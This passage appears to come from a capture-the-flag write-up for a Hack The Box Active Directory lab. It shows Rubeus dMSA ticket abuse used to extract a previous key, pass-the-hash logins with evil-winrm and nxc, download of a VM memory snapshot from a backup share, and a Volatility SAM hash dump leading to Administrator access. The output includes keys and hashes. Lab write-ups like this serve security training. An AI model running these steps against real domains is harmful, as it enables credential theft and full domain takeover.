A/W/Bbd+q48Aq2vhfu7JgyJKVrL5UEmv8F/vYcnd6Jt0CwxkuLgyof3QMW55hlM791soZegqJSBXqJ1O5o0OU1HVTduZtkqB2woV0AFTyKzZAcGaf/1vYQ5RSFPLyA4cXT4IDMCs53R1XMiNIm6oqWl+QI3nCyUlVjzLeaJot3lRsQlOj8PKuRhKt2ruyTub4DQ8zp3NQuVho4DD1ztbRi9Azih0JOp+pFoFlzBvA0heJFdWCooD

KZwG6mzYJp65/jC3cXzwJsiEudC592DfxcCo017ayWvqHZ8jVUXwx7iKyRTeecA+zDJm7lFf1mZt6ytCQbJrUcTP2Hvg5C2NPTs1IUx285+5l2kq0zh+seVkfpET2yet6eYwydVtx1RtNBOfeQNcZWJQpHJx7llVAkQTLAo1HojXSD4KP2SN2dYHA3ip8FlnhH6OWEsw6MiBEu+bIFn0xu/prqIKYFd9Nmtey/VgqhzQh+qk22+F

Chx7+rs3iMHau361qgdfih7hbivO+e6r9U5dWG3iUeNSYak8NwZisJZYCkJdOWp+qij0OZxUuMqB2yj9n2jJOhtHmGkIIHNbodEpF6YMLvVT8ErwpECacpzriOkBSkK5qt6zBF+GJ4cXomoFoMX1gtVsno/tSjgBKVHfyZZ84jp7+gyq9IcbPMqM/116S3kxJmLCV01i5LfVbj9rJI7DntdpxsyJscUxFoKOZWI3y5f5ISCNKBjz

600c/du6/QypQnOyejgfIwge+gAwIBAKKB5wSB5H2B4TCB3qCB2zCB2DCB1aArMCmgAwIBEqEiBCBpHII59zjzAgY6jrjqX6tJjlP3bHeamA63gLe5N6e/56EQGw5jaGVja3BvaW50Lmh0YqIbMBmgAwIBAaESMBAbDmF0dGFja2VyX2Rtc2EkowcDBQBgoQAApREYDzIwMjYwNjE0MTYwOTU3WqYRGA8yMDI2MDYxNDE2MjQ1N1

qnERgPMjAyNjA2MjExNjAzMTBaqBAbDkNIRUNLUE9JTlQuSFRCqSMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQg==



&#x20; ServiceName              :  krbtgt/CHECKPOINT.HTB

&#x20; ServiceRealm             :  CHECKPOINT.HTB

&#x20; UserName                 :  attacker\_dmsa$ (NT\_PRINCIPAL)

&#x20; UserRealm                :  checkpoint.htb

&#x20; StartTime                :  6/14/2026 9:09:57 AM

&#x20; EndTime                  :  6/14/2026 9:24:57 AM

&#x20; RenewTill                :  6/21/2026 9:03:10 AM

&#x20; Flags                    :  name\_canonicalize, pre\_authent, renewable, forwarded, forwardable

&#x20; KeyType                  :  aes256\_cts\_hmac\_sha1

&#x20; Base64(key)              :  aRyCOfc48wIGOo646l+rSY5T92x3mpgOt4C3uTenv+c=

&#x20; Current Keys for attacker\_dmsa$: (aes256\_cts\_hmac\_sha1) EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF



PS C:\\Temp> klist



Current LogonId is 0:0x6babc



Cached Tickets: (1)



\#0>    Client: attacker\_dmsa$ @ checkpoint.htb

&#x20;   Server: krbtgt/CHECKPOINT.HTB @ CHECKPOINT.HTB

&#x20;   KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96

&#x20;   Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre\_authent name\_canonicalize

&#x20;   Start Time: 6/14/2026 9:09:57 (local)

&#x20;   End Time:   6/14/2026 9:24:57 (local)

&#x20;   Renew Time: 6/21/2026 9:03:10 (local)

&#x20;   Session Key Type: AES-256-CTS-HMAC-SHA1-96

&#x20;   Cache Flags: 0x1 -> PRIMARY

&#x20;   Kdc Called:





\[#] well the build was successful and we even got a valid tgs as well





\[#] now when we look closely at this   Current Keys for attacker\_dmsa$: (aes256\_cts\_hmac\_sha1) EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF, this showed as the current key hash, while to takeover, the account svc\_deploy, we need the previous hash as well





\[#] We can run the command with debug flag enabled, and that will give us the previous key



.\\Rubeus.exe asktgs /targetuser:attacker\_dmsa$ /service:krbtgt/checkpoint.htb /opsec /dmsa /nowrap /debug /ticket:C:\\Temp\\ryan\_tgt.kirbi







\[#] The key will be exposed in dmas key packaged with one current key and one previous key





\[DECODE] True MIGqoGMwYTApoAMCARKhIgQg78pLcBCGNV+aK0osJCU57dGxRmV7tpdRF9lHcVhj+O8wGaADAgERoRIEEFIlv7X+ytj1QAh9kVAgrKkwGaADAgEXoRIEEJaX1xD7q3UBeFiaH38bWZehHTAbMBmgAwIBF6ESBBDhYIHrB3rKdL2/ivEq9DrJohEYDzE2MDEwMTMwMTgxNjQ0WqQRGA8xNjAxMDEzMDE4MjE0NFo=





\[#] Okay so this is a base64 encoded ticket string, we gotta decode it compact DER format





cat > dmsa\_keypkg.b64 <<'EOF'

MIGqoGMwYTApoAMCARKhIgQg78pLcBCGNV+aK0osJCU57dGxRmV7tpdRF9lHcVhj+O8wGaADAgERoRIEEFIlv7X+ytj1QAh9kVAgrKkwGaADAgEXoRIEEJaX1xD7q3UBeFiaH38bWZehHTAbMBmgAwIBF6ESBBDhYIHrB3rKdL2/ivEq9DrJohEYDzE2MDEwMTMwMTgxNjQ0WqQRGA8xNjAxMDEzMDE4MjE0NFo=

EOF



base64 -d dmsa\_keypkg.b64 > dmsa\_keypkg.der







\[#] Now we can parse the DER with openssl



openssl asn1parse -inform DER -in dmsa\_keypkg.der



&#x20;   0:d=0  hl=3 l= 170 cons: SEQUENCE

&#x20;   3:d=1  hl=2 l=  99 cons: cont \[ 0 ]

&#x20;   5:d=2  hl=2 l=  97 cons: SEQUENCE

&#x20;   7:d=3  hl=2 l=  41 cons: SEQUENCE

&#x20;   9:d=4  hl=2 l=   3 cons: cont \[ 0 ]

&#x20;  11:d=5  hl=2 l=   1 prim: INTEGER           :12

&#x20;  14:d=4  hl=2 l=  34 cons: cont \[ 1 ]

&#x20;  16:d=5  hl=2 l=  32 prim: OCTET STRING      \[HEX DUMP]:EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF

&#x20;  50:d=3  hl=2 l=  25 cons: SEQUENCE

&#x20;  52:d=4  hl=2 l=   3 cons: cont \[ 0 ]

&#x20;  54:d=5  hl=2 l=   1 prim: INTEGER           :11

&#x20;  57:d=4  hl=2 l=  18 cons: cont \[ 1 ]

&#x20;  59:d=5  hl=2 l=  16 prim: OCTET STRING      \[HEX DUMP]:5225BFB5FECAD8F540087D915020ACA9

&#x20;  77:d=3  hl=2 l=  25 cons: SEQUENCE

&#x20;  79:d=4  hl=2 l=   3 cons: cont \[ 0 ]

&#x20;  81:d=5  hl=2 l=   1 prim: INTEGER           :17

&#x20;  84:d=4  hl=2 l=  18 cons: cont \[ 1 ]

&#x20;  86:d=5  hl=2 l=  16 prim: OCTET STRING      \[HEX DUMP]:9697D710FBAB750178589A1F7F1B5997

&#x20; 104:d=1  hl=2 l=  29 cons: cont \[ 1 ]

&#x20; 106:d=2  hl=2 l=  27 cons: SEQUENCE

&#x20; 108:d=3  hl=2 l=  25 cons: SEQUENCE

&#x20; 110:d=4  hl=2 l=   3 cons: cont \[ 0 ]

&#x20; 112:d=5  hl=2 l=   1 prim: INTEGER           :17

&#x20; 115:d=4  hl=2 l=  18 cons: cont \[ 1 ]

&#x20; 117:d=5  hl=2 l=  16 prim: OCTET STRING      \[HEX DUMP]:E16081EB077ACA74BDBF8AF12AF43AC9

&#x20; 135:d=1  hl=2 l=  17 cons: cont \[ 2 ]

&#x20; 137:d=2  hl=2 l=  15 prim: GENERALIZEDTIME   :16010130181644Z

&#x20; 154:d=1  hl=2 l=  17 cons: cont \[ 4 ]

&#x20; 156:d=2  hl=2 l=  15 prim: GENERALIZEDTIME   :16010130182144Z





\[#] The parsed structure shows count\[0] for current key and count\[1] for previous key







\[#] based on the four OCTET strings



current aes256 : EFCA4B701086355F9A2B4A2C242539EDD1B146657BB6975117D947715863F8EF

current key    : 5225BFB5FECAD8F540087D915020ACA9

current key    : 9697D710FBAB750178589A1F7F1B5997

**previous key   : E16081EB077ACA74BDBF8AF12AF43AC9**





\[#] The previous key is seems to be the NTLM hash for the superseded account 





$ evil-winrm -i DC01.checkpoint.htb -u 'svc\_deploy' -H E16081EB077ACA74BDBF8AF12AF43AC9





Info: Establishing connection to remote endpoint

\*Evil-WinRM\* PS C:\\Users\\svc\_deploy\\Documents> whoami /priv



PRIVILEGES INFORMATION

\----------------------



Privilege Name                Description                    State

============================= ============================== =======

SeMachineAccountPrivilege     Add workstations to domain     Enabled

SeChangeNotifyPrivilege       Bypass traverse checking       Enabled

SeIncreaseWorkingSetPrivilege Increase a process working set Enabled





\*Evil-WinRM\* PS C:\\Users\\svc\_deploy\\Documents> whoami /groups



GROUP INFORMATION

\-----------------



Group Name                                  Type             SID                                            Attributes

=========================================== ================ ============================================== ==================================================

Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group

BUILTIN\\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group

BUILTIN\\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group

BUILTIN\\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group

NT AUTHORITY\\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group

**CHECKPOINT\\BackupAccess                     Group            S-1-5-21-3129162710-3498938529-1807524340-1123 Mandatory group, Enabled by default, Enabled group**

NT AUTHORITY\\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group

Mandatory Label\\Medium Plus Mandatory Level Label            S-1-16-8448







\[#] Well there is a custom group called BackupAccess that we belong to 





\[#] well there was a VMBackups share we found during the SMB enumeration, with no read permissions, is seems to have read permission for this user 





$ nxc smb checkpoint.htb -u 'svc\_deploy' -H E16081EB077ACA74BDBF8AF12AF43AC9 --shares





SMB         10.129.78.103   445    DC01             \[\*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)

SMB         10.129.78.103   445    DC01             \[+] checkpoint.htb\\svc\_deploy:E16081EB077ACA74BDBF8AF12AF43AC9

SMB         10.129.78.103   445    DC01             \[\*] Enumerated shares

SMB         10.129.78.103   445    DC01             Share           Permissions            Remark

SMB         10.129.78.103   445    DC01             -----           -----------            ------

SMB         10.129.78.103   445    DC01             ADMIN$                                 Remote Admin

SMB         10.129.78.103   445    DC01             C$                                     Default share

SMB         10.129.78.103   445    DC01             DevDrop                                VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0

SMB         10.129.78.103   445    DC01             IPC$            READ                   Remote IPC

SMB         10.129.78.103   445    DC01             NETLOGON        READ                   Logon server share 

SMB         10.129.78.103   445    DC01             SYSVOL          READ                   Logon server share 

**SMB         10.129.78.103   445    DC01             VMBackups       READ**                







\[#] Lets connect it via SMB to look at the share





$ smbclient.py \\

&#x20;   -hashes :E16081EB077ACA74BDBF8AF12AF43AC9 \\

&#x20;   'checkpoint.htb/svc\_deploy@checkpoint.htb'

Impacket v0.13.0 - Copyright Fortra, LLC and its affiliated companies



Type help for list of commands

\# use VMBackups

\# tree .

/NightlyBackup\_2024-11-01/memory forensics

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019-000001.vmdk

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmem

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019-Snapshot1.vmsn

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.nvram

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.scoreboard

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.vmdk

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.vmsd

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.vmx

/NightlyBackup\_2024-11-01/memory forensics/Windows Server 2019.vmxf

Finished - 11 files and folders

\# cd /NightlyBackup\_2024-11-01/memory forensics

\# lcd ./loot

./loot

\# get Windows Server 2019-Snapshot1.vmem

...







\[#] well these are  big VMware files, so might take a while to download





\[#] Now the targeted file for forensics would be this Windows Server 2019-Snapshot1.vmem, which contains logon materials LSASS secrets and cached Kerberos tickets.





\[#] Lets try getting the snapshot windows info



$ vol -f "Windows Server 2019-Snapshot1.vmem" windows.info

Volatility 3 Framework 2.28.0

WARNING  volatility3.framework.layers.vmware: No metadata file found alongside VMEM file. A VMSS or VMSN file may be required to correctly process a VMEM file. These should be placed in the same

directory with the same file name, e.g. Windows%20Server%202019-Snapshot1.vmem and Windows%20Server%202019-Snapshot1.vmss.

Progress:  100.00		PDB scanning finished

Variable	Value



Kernel Base	0xf80725608000

DTB	0x1ad000

Symbols	file:///home/fsociety/.cache/volatility3/symbols/windows/ntkrnlmp.pdb/EF9A48AFA50FF07C616585BB01919536-1.json.xz

Is64Bit	True

IsPAE	False

layer\_name	0 WindowsIntel32e

memory\_layer	1 FileLayer

KdVersionBlock	0xf80725a08f10

Major/Minor	15.17763

MachineType	34404

KeNumberProcessors	2

SystemTime	2026-05-09 14:08:58+00:00

NtSystemRoot	C:\\Windows

NtProductType	NtProductServer

NtMajorVersion	10

NtMinorVersion	0

PE MajorOperatingSystemVersion	10

PE MinorOperatingSystemVersion	0

PE Machine	34404

PE TimeDateStamp	Sun Nov 10 07:20:39 2075



&#x20; 	





\[#] Volatility built the translation layer, resolved the kernel, and treated the .vmem as a real Windows memory image





\[#] Now lets try dumping the SAM hashes





$ vol -f "Windows Server 2019-Snapshot1.vmem" windows.registry.hashdump

Volatility 3 Framework 2.28.0

Progress:  100.00        PDB scanning finished

User    rid lmhash  nthash



**Administrator    500 aad3b435b51404eeaad3b435b51404ee    f29e9c014295b9b32139b09a2790be3b**

Guest    501 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0

DefaultAccount    503 aad3b435b51404eeaad3b435b51404ee    31d6cfe0d16ae931b73c59d7e0c089c0

WDAGUtilityAccount    504 aad3b435b51404eeaad3b435b51404ee    28f8d934dee90b2ec824351cb0844479







\[#] Fortunately we got the NT hashes







\[#] Lets get root access with that NT admin hash



$ evil-winrm -i checkpoint.htb -u Administrator -H f29e9c014295b9b32139b09a2790be3b

Info: Establishing connection to remote endpoint

\*Evil-WinRM\* PS C:\\Users\\Administrator\\Documents> ls ..\\desktop

\*Evil-WinRM\* PS C:\\Users\\Administrator\\Documents> ls C:\\Users



&#x20;   Directory: C:\\Users



Mode                 LastWriteTime         Length Name

\----                 -------------         ------ ----

d-----         5/25/2026   6:26 PM                Administrator

d-----         5/25/2026   6:34 PM                max.palmer

d-r---          5/9/2026  12:30 AM                Public

d-----         5/21/2026   4:19 PM                ryan.brooks

d-----         6/14/2026   2:20 PM                svc\_deploy



\*Evil-WinRM\* PS C:\\Users\\Administrator\\Documents> type C:\\Users\\max.palmer\\Desktop\\root.txt

b\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*\*4







\[#] Domain Compromised!





